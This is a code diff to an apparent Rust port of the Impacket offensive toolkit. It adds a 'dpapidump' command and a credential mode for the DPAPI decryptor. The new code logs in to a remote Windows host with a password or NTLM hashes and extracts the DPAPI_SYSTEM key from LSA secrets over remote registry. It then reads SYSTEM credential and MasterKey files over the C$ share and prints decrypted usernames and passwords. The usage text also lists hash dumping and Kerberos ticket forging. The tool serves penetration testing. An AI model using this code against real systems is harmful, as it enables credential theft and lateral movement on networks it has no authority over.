@@ -161,7 +161,8 @@ fn print_usage() {
     println!("  regsecrets <TARGET> [-hashes LM:NT] [-security]      Dump SAM/LSA secrets in-memory via RRP (zero disk writes)");
     println!("  ntdsdump <SYSTEM_FILE> <NTDS_FILE>                   Offline Active Directory domain NT/LM hashes dumper");
     println!("  esentutl <DATABASE_FILE> [tables|table <NAME>]        Extensible Storage Engine (ESE) offline database inspector");
-    println!("  dpapi <masterkey|blob> <FILE> [-key <HEX>]           Windows DPAPI MasterKey & Blob offline decryptor");
+    println!("  dpapi <masterkey|blob|credential> <FILE> [-key <HEX>] Windows DPAPI MasterKey, Blob & Credential offline decryptor");
+    println!("  dpapidump <TARGET> [options]                          Remote DPAPI SYSTEM credentials and MasterKeys harvester");
     println!("  keylistattack [TARGET] -rodcNo <NO> -rodcKey <HEX>   Dump domain user secrets via MS-KILE KERB-KEY-LIST attack (RODC)");
     println!("  ticketConverter <INPUT> <OUTPUT> [-b]                Convert between .kirbi (Mimikatz) and .ccache (MIT)");
     println!("  ticketer -domain-sid <SID> -domain <D> [options]     Forge Kerberos Golden and Silver Tickets (.ccache / .kirbi)");
@@ -2715,9 +2716,305 @@ fn cmd_dpapi(args: &[String]) {
                 }
             }
         }
+        "credential" | "cred" => {
+            match impacket_sam::CredentialFile::parse(&file_bytes) {
+                Ok(cred_file) => {
+                    println!("[+] Credential File Details:");
+                    println!("  Version          : {}", cred_file.version);
+                    println!("  MasterKey GUID   : {}", cred_file.blob.master_key_guid_str());
+                    println!("  Crypt Algo       : 0x{:08x}", cred_file.blob.crypt_algo);
+                    println!("  Hash Algo        : 0x{:08x}", cred_file.blob.hash_algo);
+                    println!("  Description      : {}", cred_file.blob.description);
+
+                    if let Some(ref khex) = hex_key {
+                        let clean_hex = khex.trim_start_matches("0x").trim();
+                        if let Ok(kbytes) = decode_hex(clean_hex) {
+                            match cred_file.blob.decrypt(&kbytes, None) {
+                                Ok(cleartext) => {
+                                    match impacket_sam::CredentialBlob::parse(&cleartext) {
+                                        Ok(cred) => {
+                                            println!("[+] Decrypted Credential:");
+                                            println!("  Target      : {}", cred.target);
+                                            println!("  Username    : {}", cred.username);
+                                            println!("  Password    : {}", cred.password_str());
+                                        }
+                                        Err(_) => {
+                                            if let Ok(s) = std::str::from_utf8(&cleartext) {
+                                                println!("[+] Decrypted Plaintext: {}", s);
+                                            } else {
+                                                println!("[+] Decrypted Plaintext (hex): {}", encode_hex(&cleartext));
+                                            }
+                                        }
+                                    }
+                                }
+                                Err(e) => {
+                                    eprintln!("[-] Decryption failed: {}", e);
+                                }
+                            }
+                        } else {
+                            eprintln!("[-] Invalid hex key string");
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("[-] Failed to parse Credential File: {}", e);
+                }
+            }
+        }
         _ => {
-            eprintln!("[-] unknown mode '{}', expected 'masterkey' or 'blob'", mode);
+            eprintln!("[-] unknown mode '{}', expected 'masterkey', 'blob', or 'credential'", mode);
             std::process::exit(1);
+        }
+    }
+}
+
+fn cmd_dpapidump(args: &[String]) {
+    use impacket_core::decode_hex;
+    use impacket_sam::{CredentialBlob, CredentialFile, DpapiSystem, MasterKey, MasterKeyFile};
+    use impacket_smb::{SmbConnection, SmbCredential};
+    use std::collections::HashMap;
+
+    print!("{}", version::BANNER);
+    if args.is_empty() {
+        println!("usage: impacket-rs dpapidump <TARGET> [options]");
+        println!();
+        println!("Automates extraction of Windows DPAPI credentials and MasterKeys for the SYSTEM user on a remote host.");
+        println!();
+        println!("positional arguments:");
+        println!("  target                [[domain/]username[:password]@]<targetName or address>");
+        println!();
+        println!("options:");
+        println!("  -hashes LM:NT         NTLM hashes for authentication");
+        println!("  -key <HEX>            Pre-extracted DPAPI_SYSTEM user/machine key (skips remote LSA extraction)");
+        println!("  -share <SHARE>        SMB share to access filesystem (default: C$)");
+        println!("  -cred-path <PATH>     Custom directory path to scan for Credential files");
+        std::process::exit(1);
+    }
+
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] Invalid target '{}': {}", args[0], e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut explicit_key = None;
+    let mut share = "C$".to_string();
+    let mut custom_cred_path = None;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-key" if i + 1 < args.len() => {
+                explicit_key = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-share" if i + 1 < args.len() => {
+                share = args[i + 1].clone();
+                i += 2;
+            }
+            "-cred-path" if i + 1 < args.len() => {
+                custom_cred_path = Some(args[i + 1].clone());
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let host = spec.effective_target_ip();
+    println!("[*] Target system: {}", host);
+
+    let cred = if let Some(ref hashes) = spec.hashes {
+        SmbCredential::NtlmHashes(hashes.clone())
+    } else {
+        SmbCredential::Password(
+            spec.password
+                .as_ref()
+                .map(|p| p.expose_secret().to_string())
+                .unwrap_or_default(),
+        )
+    };
+
+    // 1. Obtain DPAPI_SYSTEM user/machine key
+    let mut dpapi_keys: Vec<Vec<u8>> = Vec::new();
+    if let Some(ref k_str) = explicit_key {
+        let clean = k_str.trim_start_matches("0x").trim();
+        match decode_hex(clean) {
+            Ok(k) => dpapi_keys.push(k),
+            Err(e) => {
+                eprintln!("[-] Invalid hex in -key: {}", e);
+                std::process::exit(1);
+            }
+        }
+    } else {
+        println!("[*] Extracting LSA secrets via MS-RRP on {} to retrieve DPAPI_SYSTEM key...", host);
+        let rrp_iface = &WELL_KNOWN_INTERFACES[IFACE_RRP];
+        let lsa_res = (|| -> Result<(), CoreError> {
+            let transport = SmbPipeTransport::connect(
+                host,
+                &spec.domain,
+                &spec.username,
+                &cred,
+                "winreg",
+                rrp_iface.uuid,
+                rrp_iface.version_major,
+                rrp_iface.version_minor,
+                spec.compat_profile,
+                DEFAULT_TIMEOUT,
+            )?;
+            let mut rrp = RrpClient::new(transport);
+            let report = impacket_sam::regsecrets_dump(&mut rrp)?;
+            for item in report.lsa_secrets {
+                if item.name.eq_ignore_ascii_case("DPAPI_SYSTEM") {
+                    if let Ok(sys) = DpapiSystem::parse(&item.secret_raw) {
+                        println!("[+] Retrieved DPAPI_SYSTEM secret from LSA:");
+                        println!("    UserKey    : 0x{}", impacket_core::encode_hex(&sys.user_key));
+                        println!("    MachineKey : 0x{}", impacket_core::encode_hex(&sys.machine_key));
+                        dpapi_keys.push(sys.user_key.to_vec());
+                        dpapi_keys.push(sys.machine_key.to_vec());
+                    }
+                }
+            }
+            Ok(())
+        })();
+
+        if let Err(e) = lsa_res {
+            eprintln!("[-] Remote LSA secret extraction failed: {}. Provide pre-extracted key with -key <HEX>", e);
+            std::process::exit(1);
+        }
+    }
+
+    if dpapi_keys.is_empty() {
+        eprintln!("[-] No DPAPI_SYSTEM keys available. Quitting.");
+        std::process::exit(1);
+    }
+
+    // 2. Connect to SMB and scan for credential files
+    println!("[*] Connecting to SMB share '{}' on {}...", share, host);
+    let mut conn = match SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] SMB connection failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    if let Err(e) = conn.login(&spec.domain, &spec.username, &cred, "impacket-rs") {
+        eprintln!("[-] SMB login failed: {}", e);
+        std::process::exit(1);
+    }
+
+    if let Err(e) = conn.tree_connect_share(host, &share) {
+        eprintln!("[-] Failed to connect to share '{}': {}", share, e);
+        std::process::exit(1);
+    }
+
+    let mut scan_paths = vec![
+        r"Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials".to_string(),
+        r"Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials".to_string(),
+    ];
+    if let Some(cp) = custom_cred_path {
+        scan_paths.push(cp);
+    }
+
+    let mut found_credentials: Vec<(String, Vec<u8>)> = Vec::new();
+    for p in &scan_paths {
+        println!("[*] Scanning directory: {}", p);
+        if let Ok(entries) = conn.list_directory(p) {
+            for entry in entries {
+                if !entry.is_directory {
+                    if entry.name.contains("DFBE70A7E5CC19A398EBF1B96859CE5D") {
+                        continue;
+                    }
+                    let file_path = format!(r"{}\{}", p, entry.name);
+                    if let Ok(content) = conn.read_full_file(&file_path) {
+                        println!("[+] Found credential file: {} ({} bytes)", file_path, content.len());
+                        found_credentials.push((file_path, content));
+                    }
+                }
+            }
+        }
+    }
+
+    if found_credentials.is_empty() {
+        println!("[*] No credential files found in standard systemprofile paths.");
+        return;
+    }
+
+    // 3. For each credential, resolve its MasterKey GUID and decrypt
+    let mk_base_dir = r"Windows\System32\Microsoft\Protect\S-1-5-18\User";
+    let mut decrypted_masterkeys: HashMap<String, [u8; 64]> = HashMap::new();
+
+    for (cred_path, cred_bytes) in &found_credentials {
+        let cred_file = match CredentialFile::parse(cred_bytes) {
+            Ok(cf) => cf,
+            Err(e) => {
+                eprintln!("[-] Skipping corrupted credential file {}: {}", cred_path, e);
+                continue;
+            }
+        };
+
+        let guid_str = cred_file.blob.master_key_guid_str();
+        println!("[*] Credential '{}' references MasterKey GUID: {}", cred_path, guid_str);
+
+        if !decrypted_masterkeys.contains_key(&guid_str) {
+            let mk_remote_path = format!(r"{}\{}", mk_base_dir, guid_str);
+            match conn.read_full_file(&mk_remote_path) {
+                Ok(mk_raw) => {
+                    let mk_obj = if let Ok(mkf) = MasterKeyFile::parse(&mk_raw) {
+                        MasterKey::parse(&mkf.master_key_bytes)
+                    } else {
+                        MasterKey::parse(&mk_raw)
+                    };
+
+                    match mk_obj {
+                        Ok(mk) => {
+                            let mut decrypted = None;
+                            for k in &dpapi_keys {
+                                if let Ok(clear) = mk.decrypt(k) {
+                                    decrypted = Some(clear);
+                                    break;
+                                }
+                            }
+                            if let Some(clear_mk) = decrypted {
+                                println!("[+] Successfully decrypted MasterKey {}: 0x{}", guid_str, impacket_core::encode_hex(&clear_mk));
+                                decrypted_masterkeys.insert(guid_str.clone(), clear_mk);
+                            } else {
+                                eprintln!("[-] Failed decrypting MasterKey {} with available DPAPI_SYSTEM keys", guid_str);
+                            }
+                        }
+                        Err(e) => eprintln!("[-] Failed parsing MasterKey {}: {}", mk_remote_path, e),
+                    }
+                }
+                Err(e) => eprintln!("[-] Could not retrieve MasterKey file {}: {}", mk_remote_path, e),
+            }
+        }
+
+        if let Some(master_key) = decrypted_masterkeys.get(&guid_str) {
+            match cred_file.blob.decrypt(master_key, None) {
+                Ok(clear_blob) => {
+                    match CredentialBlob::parse(&clear_blob) {
+                        Ok(cb) => {
+                            println!();
+                            println!("============================================================");
+                            println!("[+] DECRYPTED CREDENTIAL: {}", cred_path);
+                            println!("    Target      : {}", cb.target);
+                            println!("    Username    : {}", cb.username);
+                            println!("    Password    : {}", cb.password_str());
+                            println!("============================================================");
+                        }
+                        Err(_) => {
+                            if let Ok(s) = std::str::from_utf8(&clear_blob) {
+                                println!("[+] Decrypted Payload: {}", s);
+                            } else {
+                                println!("[+] Decrypted Payload (hex): 0x{}", impacket_core::encode_hex(&clear_blob));
+                            }
+                        }
+                    }
+                }
+                Err(e) => eprintln!("[-] Failed decrypting credential {} with MasterKey: {}", cred_path, e),
+            }
         }
     }
 }
@@ -14360,6 +14657,7 @@ fn main() {
         Some("ntdsdump") | Some("ntds-dump") => cmd_ntdsdump(&args[1..]),
         Some("esentutl") => cmd_esentutl(&args[1..]),
         Some("dpapi") => cmd_dpapi(&args[1..]),
+        Some("dpapidump") | Some("dpapi-dump") => cmd_dpapidump(&args[1..]),
         Some("backupkey") | Some("backupkeys") | Some("bkrp") => cmd_backupkey(&args[1..]),
         Some("Get-GPPPassword")
         | Some("get-gpppassword")
